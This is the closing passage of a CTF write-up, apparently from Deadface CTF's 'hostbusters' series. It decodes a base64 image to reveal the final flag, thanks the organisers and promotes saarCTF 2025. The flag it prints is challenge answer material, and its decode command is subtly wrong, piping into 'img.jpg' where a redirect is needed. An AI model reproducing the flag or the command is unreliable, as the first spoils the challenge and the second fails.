g7M1EgABAwEFBQYEBQMEAwAAAAABABEhAhAgUDFBMFFhcRJAYKGxIgOBkcHRcPDhMhPxUiOAQnKC
...
```

I copied (again) only a bit of the output. But we can just use this copy all
, put it into a file and then convert it back to binary:

`cat img.base64 | base64 -d | img.jpg`

<center>
![](../flag.jpg)
</center>

And thus we get the last flag:

`deadface{hostbusters8_70139688d8cead3}`

---

<center>
    <h1>Closing Thoughts<h1>
</center>

So this is it. This was hostbusters. I hope you all had fun and learned
something. These challenges were extremely fun and I think they have a quite
unique take on jeopardy CTF challenges. They represent a window into the real
world, providing a glimse into how actual penetration testers work. Lastely
I would like to shoutout the challenge author 
[@syyntax](https://www.linkedin.com/in/jason-scott-cissp-903211118/), but also
the whole [Cyber Hacktics Crew](https://blog.cyberhacktics.org/). Please
check out their stuff and leave some love:
1. [X / Twitter](https://x.com/chacktics)
2. [Instagram](https://www.instagram.com/cyberhacktics/)
3. [Cyber Hacktics LinkedIn](https://www.linkedin.com/company/cyber-hacktics)
4. [Cyber Hacktics Blog](https://blog.cyberhacktics.org/)
5. [synntax's LinkedIn](https://www.linkedin.com/in/jason-scott-cissp-903211118/)


Also a shoutout to [saarsec](http://saarsec.rocks) the CTF group I am part of, 
who support the German CTF and cybersecurity community so much. And last but not
least a little promo for our upcoming CTF: 
[saarCTF 2025](https://ctf.saarland) (8th of November 2025):

{% alert(type="info", icon="info", title="saarCTF 2025") %}
Our sixth iteration, saarCTF 2025 will take place on Saturday, 08.11.2025, 13:00 
UTC and last for 8 hours, plus one hour preparation time where network is 
closed. The competition is open to everybody.

We invite you to a classical attack-defense competition. This year, we offer you 
to host your vulnbox VM in the cloud for you, making things much easier to set 
up! We will likely provide Virtualbox images as a usual alternative.

The registration is available later, and will stay open until a few hours before 
the competition starts.
{% end %}